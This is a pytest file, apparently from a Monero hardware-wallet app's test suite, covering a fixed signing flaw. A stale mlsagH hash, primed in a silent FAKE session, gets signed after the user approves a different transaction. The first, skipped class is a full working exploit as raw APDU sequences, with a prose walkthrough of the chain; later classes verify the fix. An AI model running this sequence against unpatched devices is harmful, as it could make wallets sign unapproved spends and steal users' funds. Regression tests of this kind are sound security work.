"""
A stale mlsagH survives CLOSE_TX and is what gets signed.

Everything the device signs reduces to G_monero_vstate.mlsagH, written only in the
terminal branch of INS_VALIDATE/P1=3, after the approval gate, the commitment-chain
check and the prefixH check have all passed.

Two things break the link to the reviewed tx. monero_reset_tx() clears
user_approved_tx, r, R and tx_main_txkey but leaves mlsagH (and prefixH, and C)
intact, so they outlive INS_CLOSE_TX. And P1=3 has a second, non-terminal form:
with IN_OPTION_MORE_COMMAND set it accumulates one hash and returns -- no gate, no
compare, no keccak_final_H -- yet update_protocol() still records tx_state_p1 = 3,
which is all monero_dispatch() asks for before INS_MLSAG/INS_CLSAG.

FAKE mode reaches the terminal branch with no review and a host-chosen prefixH, so
it is a write oracle for mlsagH; INS_SET_SIGNATURE_MODE can be flipped between
transactions. So: prime mlsagH in a silent FAKE session, close it, run an honest
REAL session the user really approves, then send the non-terminal P1=3. Signing
unlocks over the attacker's hash.

The gates that existed before could not catch this: user_approved_tx really is 1
and the MLSAG/CLSAG challenge really is bound to mlsagH -- mlsagH itself just wasn't
per-tx. Not device specific either; the defect is the dispatcher and the reset path,
so BAGL and NBGL were both affected.

The fix is a per-transaction prehash_finalized flag, set only at the end of the
terminal P1=3 branch and cleared by monero_reset_tx(), required before
INS_MLSAG/INS_CLSAG.

Classes, in file order:
  TestStaleMlsagHVuln          the original exploit; skipped, since it now fails.
                               Run with --run-skipped against a build without the
                               flag to re-confirm it.
  TestHonestSigningStillWorks  the honest terminal finalize must still unlock
                               signing. Worth its own class: no other test in the
                               suite sends INS_MLSAG, so nothing else would notice
                               if the gate blocked legitimate signing.
  TestPrehashFinalizedEnforced the same attack must now be refused with 0x691E,
                               while the legitimate accumulate step keeps working.
                               Kept last: the refusal exits the app.

Run: pytest tests/test_vuln_stale_mlsagh.py -v --device flex   (DEBUG=1 build;
protocol V3 means INS_MLSAG, CLSAG would need V4).

Snapshot dirs are named after the bare test function, so method names must stay
unique across the whole suite.
"""

import struct

import pytest
from Crypto.Hash import keccak

from ragger.backend.interface import BackendInterface
from ragger.error import ExceptionRAPDU
from ragger.navigator import Navigator

from monero_client.monero_types import SigType, Keys, Type, InsType
from monero_client.monero_cmd import MoneroCmd, PROTOCOL_VERSION
from monero_client.monero_crypto_cmd import MoneroCryptoCmd
from monero_client.crypto.hmac import hmac_sha256
from monero_client.utils.tx_prefix import build_tx_prefix_outkeys
from monero_client.utils.varint import encode_varint

# ed25519 group order; monero_reduce() is a little-endian mod-l reduce.
L = 2 ** 252 + 27742317777372353535851937790883648493

# Returned once mlsagH is not known to belong to the transaction being signed.
SW_SECURITY_PREHASH_NOT_FINALIZED = 0x691E

ZERO_COMMITMENT = bytes(32)
# Any well-formed scalar: the FAKE session's INS_BLIND only needs a valid mask.
DUMMY_MASK = (1).to_bytes(32, "little")
# Attacker-chosen prefix body, streamed in FAKE mode where nothing checks it.
ATTACKER_PREFIX = b"\xde" * 96
# Range-proof slot of the terminal P1=3; unchecked, so any 32 bytes will do.
ATTACKER_PROOF = b"\xad" * 32


def _raw_apdu(ins: InsType, p1: int, p2: int, option: int, payload: bytes = b"") -> bytes:
    """Full APDU in the app's framing (option is the first data byte)."""
    return struct.pack("BBBBBB", PROTOCOL_VERSION, ins.value, p1, p2,
                       1 + len(payload), option) + payload


def _output_payload(recv: Keys, ak: bytes, blinded_mask: bytes,
                    blinded_amount: bytes, is_change: bool) -> bytes:
    """An INS_VALIDATE output record, as an honest host streams per destination."""
    return b"".join((
        b"\x00", b"\x01" if is_change else b"\x00",
        recv.public_view_key, recv.public_spend_key, ak,
        hmac_sha256(ak, MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
        ZERO_COMMITMENT, blinded_mask, blinded_amount,
    ))


def _sc_reduce(value: bytes) -> bytes:
    """monero_reduce(): little-endian scalar mod l."""
    return (int.from_bytes(value, "little") % L).to_bytes(32, "little")


def _expect_accepted(backend: BackendInterface, apdu: bytes, step: str) -> bytes:
    """Send `apdu`, return its data. Ragger raises on non-9000; turn that into a
    failure message that says what the refusal means."""
    try:
        return backend.exchange_raw(apdu).data
    except ExceptionRAPDU as exc:
        pytest.fail(f"{step} was refused with {exc.status:#06x}, but this step is "
                    "expected to be accepted here")


def _new_state():
    """2 outputs, churn to self: destination (reviewed) + 0-amount change."""
    return {
        "sender": None,
        "receiver_number": 2,
        "receiver": [None, None],
        "is_change_addr": [False, True],
        "amount": [907880000, 0],
        "tx_pub_key": None,
        "_tx_priv_key": None,
        "_ak_amount": [[], []],
        "blinded_amount": [[], []],
        "blinded_mask": [[], []],
        "y": [[], []],
        "eph_keys": [],
        "prefixh": None,
        "stale_mlsagh": None,
        "mlsagh": None,
    }


@pytest.mark.skip(reason="Demonstrates the (now-fixed) stale-mlsagH signing; passes only "
                         "on a build without the prehash_finalized gate. Use --run-skipped "
                         "to re-confirm the exploit against a vulnerable build.")
@pytest.mark.incremental
class TestStaleMlsagHVuln:
    """A hash primed in a throwaway FAKE session is what INS_MLSAG commits to,
    though the user approved a different REAL transaction."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return _new_state()

    @staticmethod
    def test_reset(monero: MoneroCmd):
        monero.reset_and_get_version(monero_client_version=b"0.18")

    @staticmethod
    def test_get_keys(monero: MoneroCmd, state):
        public_view_key, public_spend_key, base58_address = monero.get_public_keys()
        sender = Keys(public_view_key=public_view_key,
                      public_spend_key=public_spend_key,
                      secret_view_key=None, secret_spend_key=None,
                      addr=base58_address)
        state["sender"] = sender
        state["receiver"][0] = sender  # churn to self
        state["receiver"][1] = sender

    # ------------------------------------ step 1: prime mlsagH in FAKE mode
    @staticmethod
    def test_fake_session_primes_mlsagh(monero: MoneroCmd, backend: BackendInterface,
                                        device, test_name: str, state):
        """FAKE mode shows nothing and skips every REAL-mode check, but still writes
        mlsagH -- which CLOSE_TX won't clear."""
        assert monero.set_signature_mode(sig_type=SigType.FAKE) == SigType.FAKE
        tx_pub_key, tx_priv_key, _, _ = monero.open_tx()

        ak = None
        for index in range(state["receiver_number"]):
            ak, _, _ = monero.gen_txout_keys(
                _tx_priv_key=tx_priv_key, tx_pub_key=tx_pub_key,
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                output_index=index, is_change_addr=state["is_change_addr"][index],
                is_subaddress=False)

        # No output-key binding in FAKE mode, so prefixH is just keccak of our bytes.
        monero.prefix_hash_init(test_name + "_fake", device, navigator=None,
                                version=0, timelock=0)
        prefix_h = monero.prefix_hash_update(index=1, payload=ATTACKER_PREFIX,
                                             is_last=True)
        assert prefix_h == keccak.new(
            digest_bits=256,
            data=encode_varint(0) + encode_varint(0) + ATTACKER_PREFIX).digest(), \
            "FAKE mode did not hash our prefix bytes verbatim"

        # INS_VALIDATE must follow INS_BLIND (dispatch.c:361).
        blinded_mask, blinded_amount = monero.blind(
            _ak_amount=ak, mask=DUMMY_MASK, amount=1, is_short=True)

        # P1=1 / P1=2 in FAKE mode are plain keccak updates. Raw APDUs, because the
        # client helpers wait on review screens that never appear.
        backend.exchange_raw(_raw_apdu(InsType.INS_VALIDATE, 1, 1, 0x00,
                                       b"\x00" + encode_varint(1)))
        backend.exchange_raw(_raw_apdu(InsType.INS_VALIDATE, 2, 1, 0x00,
                                       _output_payload(state["receiver"][0], ak,
                                                       blinded_mask, blinded_amount,
                                                       is_change=False)))

        # Terminal P1=3: mlsagH = keccak(message || H || proof), and message must
        # equal the prefixH we just chose. This is the hash we expect to see signed.
        rapdu = backend.exchange_raw(_raw_apdu(InsType.INS_VALIDATE, 3, 1, 0x00,
                                               prefix_h + ATTACKER_PROOF))
        assert len(rapdu.data) == 32
        state["stale_mlsagh"] = rapdu.data
        print(f"\n[prime] FAKE-session mlsagH = {rapdu.data.hex()}")

        # reset_tx() runs here and leaves mlsagH alone.
        monero.close_tx()

    # ----------------------- step 2: an honest REAL tx the user really approves
    @staticmethod
    def test_real_session_setup(monero: MoneroCmd, navigator: Navigator,
                                device, test_name: str, state):
        assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL
        tx_pub_key, tx_priv_key, _, _ = monero.open_tx()
        state["tx_pub_key"] = tx_pub_key
        state["_tx_priv_key"] = tx_priv_key

        for index in range(state["receiver_number"]):
            ak, eph, _ = monero.gen_txout_keys(
                _tx_priv_key=tx_priv_key, tx_pub_key=tx_pub_key,
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                output_index=index, is_change_addr=state["is_change_addr"][index],
                is_subaddress=False)
            state["_ak_amount"][index].append(ak)
            state["eph_keys"].append(eph)

        # Honest prefix with the device-derived keys, so the output-key binding passes.
        prefix = build_tx_prefix_outkeys(vout_keys=state["eph_keys"],
                                         tx_pubkey=state["tx_pub_key"])
        monero.prefix_hash_init(test_name, device, navigator=navigator,
                                version=0, timelock=0)
        state["prefixh"] = monero.prefix_hash_update(index=1, payload=prefix,
                                                     is_last=True)

        # All masks, then all blinds -- not interleaved. INS_GEN_COMMITMENT_MASK
        # only accepts tx_state_ins of PREFIX_HASH or GEN_COMMITMENT_MASK
        # (dispatch.c:342), so a mask after the first INS_BLIND gets 0x6980.
        for index in range(state["receiver_number"]):
            state["y"][index].append(
                monero.gen_commitment_mask(state["_ak_amount"][index][0]))
        for index in range(state["receiver_number"]):
            blinded_mask, blinded_amount = monero.blind(
                _ak_amount=state["_ak_amount"][index][0],
                mask=state["y"][index][0], amount=state["amount"][index],
                is_short=True)
            state["blinded_mask"][index].append(blinded_mask)
            state["blinded_amount"][index].append(blinded_amount)

    @staticmethod
    def test_real_session_user_approves(monero: MoneroCmd, backend: BackendInterface,
                                        navigator: Navigator, test_name, state):
        """is_last=True on the final output reaches start_signature(); the user
        confirms and user_approved_tx becomes 1."""
        monero.validate_prehash_init(test_name, backend.device, navigator, 1, 0,
                                     30660000)  # 0.00003066 XMR fee
        # Fee + Output0(amount+address) + Output1(amount) = 4 screens -> 3 swipes.
        for index in range(state["receiver_number"]):
            monero.validate_prehash_update(
                backend, test_name, navigator, index=index + 1, is_short=True,
                is_change_addr=state["is_change_addr"][index], is_subaddress=False,
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                _ak_amount=state["_ak_amount"][index][0], commitment=ZERO_COMMITMENT,
                blinded_amount=state["blinded_amount"][index][0],
                blinded_mask=state["blinded_mask"][index][0],
                is_last=index == (state["receiver_number"] - 1),
                swipe_count=3)

    # ------------------------------------------------------- step 3: the attack
    @staticmethod
    def test_non_terminal_finalize_authorizes_signing(backend: BackendInterface, state):
        """P1=3 with MORE set only accumulates: no keccak_final_H, so mlsagH keeps the
        FAKE value -- but update_protocol() records tx_state_p1 = 3 anyway."""
        data = _expect_accepted(backend,
                                _raw_apdu(InsType.INS_VALIDATE, 3, 1, 0x80, bytes(32)),
                                "the non-terminal INS_VALIDATE P1=3")
        assert len(data) == 0, "the accumulate branch must not return a hash"

    @staticmethod
    def test_mlsag_prepare_accepted(backend: BackendInterface):
        """Signing starts even though the terminal finalize never ran. A fixed build
        must reject here."""
        _expect_accepted(backend, _raw_apdu(InsType.INS_MLSAG, 1, 0, 0x00),
                         "INS_MLSAG P1=1 (prepare)")

    @staticmethod
    def test_mlsag_challenge_commits_to_stale_hash(backend: BackendInterface, state):
        """At P2=1 the device injects its own stored mlsagH (monero_mlsag.c:117) and
        returns c = reduce(keccak(mlsagH)). Matching that against the FAKE-session
        hash shows what the user actually authorized."""
        data = _expect_accepted(backend, _raw_apdu(InsType.INS_MLSAG, 2, 1, 0x00),
                                "INS_MLSAG P1=2 (hash)")
        assert len(data) == 32
        expected = _sc_reduce(keccak.new(digest_bits=256,
                                         data=state["stale_mlsagh"]).digest())
        assert data == expected, (
            "challenge does not derive from the FAKE-session mlsagH: got "
            f"{data.hex()}, expected {expected.hex()}")
        print(f"\n[confirmed] the challenge derives from the FAKE-session mlsagH "
              f"{state['stale_mlsagh'].hex()}, not from the REAL transaction the user "
              "approved. INS_MLSAG/P1=3 would sign it with the real input keys.")

    @staticmethod
    def test_close_tx(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.incremental
class TestHonestSigningStillWorks:
    """The honest path must be unaffected: a terminal INS_VALIDATE/P1=3 sets
    prehash_finalized, and INS_MLSAG then works over the hash it produced.

    No other test in the suite sends INS_MLSAG, so without this class a gate that
    wrongly blocked legitimate signing would pass CI unnoticed."""

    _V = TestStaleMlsagHVuln

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return _new_state()

    @staticmethod
    def test_honest_setup(monero: MoneroCmd, backend: BackendInterface,
                          navigator: Navigator, device, test_name: str, state):
        """One REAL transaction only -- no FAKE priming."""
        V = TestHonestSigningStillWorks._V
        V.test_reset(monero)
        V.test_get_keys(monero, state)
        V.test_real_session_setup(monero, navigator, device, test_name, state)
        V.test_real_session_user_approves(monero, backend, navigator, test_name, state)

    @staticmethod
    def test_honest_terminal_finalize_returns_hash(backend: BackendInterface, state):
        """One accumulate step then the terminal one, as the wallet does."""
        _expect_accepted(backend,
                         _raw_apdu(InsType.INS_VALIDATE, 3, 1, 0x80, bytes(32)),
                         "the non-terminal INS_VALIDATE P1=3")
        mlsagh = _expect_accepted(
            backend,
            _raw_apdu(InsType.INS_VALIDATE, 3, 2, 0x00,
                      state["prefixh"] + ATTACKER_PROOF),
            "the terminal INS_VALIDATE P1=3")
        assert len(mlsagh) == 32
        state["mlsagh"] = mlsagh

    @staticmethod
    def test_honest_mlsag_accepted(backend: BackendInterface, state):
        """Signing is unlocked, and the challenge derives from the hash the terminal
        step just produced -- not from anything left over."""
        _expect_accepted(backend, _raw_apdu(InsType.INS_MLSAG, 1, 0, 0x00),
                         "INS_MLSAG P1=1 (prepare)")
        c = _expect_accepted(backend, _raw_apdu(InsType.INS_MLSAG, 2, 1, 0x00),
                             "INS_MLSAG P1=2 (hash)")
        assert c == _sc_reduce(keccak.new(digest_bits=256,
                                         data=state["mlsagh"]).digest()), (
            "challenge does not derive from the mlsagH the device just returned")

    @staticmethod
    def test_honest_close(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.incremental
class TestPrehashFinalizedEnforced:
    """Fix verification: the exploit at the top of this file must now be refused.

    prehash_finalized is set only at the end of the terminal INS_VALIDATE/P1=3
    branch and cleared by monero_reset_tx(), so the FAKE-primed mlsagH is no longer
    signable -- even though user_approved_tx is legitimately 1.

    Last class in the file on purpose: the refusal travels through
    send_error_and_kill_app (monero_main.c:76), so the app exits to the dashboard
    afterwards and nothing can run against it. No manual cleanup is needed on
    hardware; invisible on speculos, which is torn down per class."""

    _V = TestStaleMlsagHVuln

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return _new_state()

    @staticmethod
    def test_enforced_setup(monero: MoneroCmd, backend: BackendInterface,
                            navigator: Navigator, device, test_name: str, state):
        """Same two sessions as the exploit: prime mlsagH in FAKE, then an honest
        REAL transaction the user really approves."""
        V = TestPrehashFinalizedEnforced._V
        V.test_reset(monero)
        V.test_get_keys(monero, state)
        V.test_fake_session_primes_mlsagh(monero, backend, device, test_name, state)
        V.test_real_session_setup(monero, navigator, device, test_name, state)
        V.test_real_session_user_approves(monero, backend, navigator, test_name, state)

    @staticmethod
    def test_enforced_accumulate_still_accepted(backend: BackendInterface):
        """The accumulate branch is legitimate -- the wallet sends one per output --
        so it must keep working. It just must not unlock signing."""
        data = _expect_accepted(backend,
                                _raw_apdu(InsType.INS_VALIDATE, 3, 1, 0x80, bytes(32)),
                                "the non-terminal INS_VALIDATE P1=3")
        assert len(data) == 0, "the accumulate branch must not return a hash"

    @staticmethod
    def test_enforced_mlsag_refused(backend: BackendInterface):
        """The step that used to sign the stale hash. Only one APDU is sent: the
        refusal exits the app, so any following exchange would test nothing."""
        with pytest.raises(ExceptionRAPDU) as exc:
            backend.exchange_raw(_raw_apdu(InsType.INS_MLSAG, 1, 0, 0x00))
        assert exc.value.status == SW_SECURITY_PREHASH_NOT_FINALIZED, (
            f"expected {SW_SECURITY_PREHASH_NOT_FINALIZED:#06x} for signing without a "
            f"terminal prehash, got {exc.value.status:#06x}")
        print(f"\n[fixed] INS_MLSAG refused with "
              f"{SW_SECURITY_PREHASH_NOT_FINALIZED:#06x}: the FAKE-primed mlsagH is "
              "no longer signable")
